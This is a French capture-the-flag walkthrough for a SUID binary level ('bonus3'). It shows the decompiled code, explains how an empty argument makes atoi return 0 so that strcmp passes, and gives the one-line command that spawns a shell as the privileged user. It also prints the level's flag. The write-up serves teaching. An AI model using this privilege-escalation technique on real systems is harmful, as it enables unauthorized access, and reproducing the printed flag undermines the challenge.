# Bonus3 - Walkthrough

## Objectif
Exploiter le comportement de `atoi("")` qui retourne **0** pour insérer un null byte en position 0 du buffer contenant le flag, rendant `strcmp` aveugle et déclenchant `execl("/bin/sh")`.

**Technique** : Logic Flaw via atoi("") + strcmp null-byte bypass

---

## Étapes d'exploitation

### 1. Reconnaissance
```bash
ls -la
# -rwsr-s---+ 1 end users  5595 Mar  6  2016 bonus3
# ⚠️ Bit SUID actif → s'exécute avec les droits de end

./bonus3
# (pas de sortie)

./bonus3 bla
# (affiche une ligne vide)

./bonus3 bla bla
# (pas de sortie)
```

### 2. Analyse du code (Ghidra)

```cpp
int main(int argc, char **argv) {
    char buffer[66];
    FILE *fd;
    int index;

    fd = fopen("/home/user/end/.pass", "r");
    fread(buffer, 1, 66, fd);          // Lit le flag dans buffer

    index = atoi(argv[1]);             // Convertit argv[1] en int
    buffer[index] = '\0';              // ⚠️ Insère \0 à la position index

    if (strcmp(buffer, argv[1]) == 0)  // Compare buffer et argv[1]
        execl("/bin/sh", "sh", NULL);  // Shell si égaux !

    puts(buffer);
    fclose(fd);
    return 0;
}
```

**Vulnérabilité** : `atoi("")` retourne `0` → `buffer[0] = '\0'` → `strcmp("", "")` est vrai.

### 3. Comprendre le bypass

**Comportement de `atoi`** :
```
atoi("")  → 0    (chaîne vide ou sans chiffres)
atoi("0") → 0    (mais argv[1] serait "0", pas "")
atoi("5") → 5
```

**Effet sur strcmp** :
```
buffer = [flag: 66 bytes]
buffer[0] = '\0'  → buffer est maintenant une chaîne vide ""
argv[1] = ""      → chaîne vide

strcmp("", "") == 0 ✅ → execl("/bin/sh")
```

**Pourquoi `"0"` ne fonctionne pas** :
```
argv[1] = "0"
atoi("0") → 0 → buffer[0] = '\0' → buffer = ""
strcmp("", "0") != 0 ❌ → pas de shell
```

Il faut que `argv[1]` soit **vide** (`""`) pour que `strcmp(buffer, argv[1])` compare deux chaînes vides.

### 4. Exploitation

```bash
./bonus3 ""
```

**Résultat** :
```bash
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$ cat /home/user/end/end
Congratulations graduate!
```

---

## Déroulement de l'attaque

```
1. fread(buffer, 1, 66, fd)
   buffer = "3321b6f8..." (flag complet)

2. atoi("") → 0

3. buffer[0] = '\0'
   buffer = "" (chaîne vide)

4. strcmp("", "") == 0 ✅

5. execl("/bin/sh") → Shell end 🎉
```

---

## Flag
```
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

## Type de vulnérabilité
- Logic Flaw (CWE-840)
- Improper Input Validation (CWE-20)
- atoi() edge case bypass
- SUID privilege escalation (CWE-250)
